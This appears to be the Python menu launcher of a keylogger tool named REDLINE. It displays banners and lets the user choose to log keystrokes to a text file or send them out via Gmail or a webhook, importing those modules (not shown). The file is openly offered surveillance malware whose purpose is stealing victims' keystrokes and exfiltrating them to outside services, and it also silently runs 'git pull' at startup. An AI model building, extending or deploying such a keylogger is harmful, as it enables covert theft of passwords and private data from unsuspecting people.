import os
import sys
import subprocess
from colorama import Fore
from gmail.main import *
from logger.main import *
from webhook.main import *

def REDLINE_main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.RED}
 ██▀███  ▓█████ ▓█████▄  ██▓     ██▓ ███▄    █ ▓█████ 
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██▒    ▓██▒ ██ ▀█   █ ▓█   ▀ 
▓██ ░▄█ ▒▒███   ░██   █▌▒██░    ▒██▒▓██  ▀█ ██▒▒███   
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██░    ░██░▓██▒  ▐▌██▒▒▓█  ▄ 
░██▓ ▒██▒░▒████▒░▒████▓ ░██████▒░██░▒██░   ▓██░░▒████▒
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▓  ░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒ ░ ░ ▒  ░ ▒ ░░ ░░   ░ ▒░ ░ ░  ░
  ░░   ░    ░    ░ ░  ░   ░ ░    ▒ ░   ░   ░ ░    ░   
   ░        ░  ░   ░        ░  ░ ░           ░    ░  ░
                 ░                                    {Fore.RESET}

[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] version {Fore.LIGHTRED_EX}1.0{Fore.RESET}
[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] Revolt : https://rvlt.gg/zfbvjG0r
[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] Github : https://github.com/madanokr001

    """)
    subprocess.run("git pull", shell=True, stdout=subprocess.DEVNULL)
    input(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] Enter...")

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.RED}
   ▄████████    ▄████████ ████████▄   ▄█        ▄█  ███▄▄▄▄      ▄████████
  ███    ███   ███    ███ ███   ▀███ ███       ███  ███▀▀▀██▄   ███    ███
  ███    ███   ███    █▀  ███    ███ ███       ███▌ ███   ███   ███    █▀ 
 ▄███▄▄▄▄██▀  ▄███▄▄▄     ███    ███ ███       ███▌ ███   ███  ▄███▄▄▄    
▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███    ███ ███       ███▌ ███   ███ ▀▀███▀▀▀    
▀███████████   ███    █▄  ███    ███ ███       ███  ███   ███   ███    █▄ 
  ███    ███   ███    ███ ███   ▄███ ███▌    ▄ ███  ███   ███   ███    ███
  ███    ███   ██████████ ████████▀  █████▄▄██ █▀    ▀█   █▀    ██████████
  ███    ███                         ▀                                    {Fore.RESET}
                                version {Fore.LIGHTRED_EX}1.0{Fore.RESET} 

[{Fore.LIGHTRED_EX}01{Fore.RESET}] {Fore.LIGHTRED_EX}|{Fore.RESET} Keylogger {Fore.LIGHTRED_EX}>{Fore.RESET} .TXT
[{Fore.LIGHTRED_EX}02{Fore.RESET}] {Fore.LIGHTRED_EX}|{Fore.RESET} Keylogger {Fore.LIGHTRED_EX}>{Fore.RESET} GMAIL             
[{Fore.LIGHTRED_EX}03{Fore.RESET}] {Fore.LIGHTRED_EX}|{Fore.RESET} Keylogger {Fore.LIGHTRED_EX}>{Fore.RESET} WEBHOOK           
[{Fore.LIGHTRED_EX}04{Fore.RESET}] {Fore.LIGHTRED_EX}|{Fore.RESET} EXIT        
                                                
    """)

def main():
    while True:
        logo()
        select = input(f"""
╔═══[root@{Fore.LIGHTRED_EX}REDLINE{Fore.RESET}]~$
╚══> """)

        if select == "1" or select.lower() == "1":
            log()

        elif select == "2" or select.lower() == "5":
            email_log()

        elif select == "3" or select.lower() == "5":
            webhook_log()
                     
        elif select == "4" or select.lower() == "5":
            sys.exit()
    
             


if __name__ == "__main__":
    REDLINE_main()
    main()
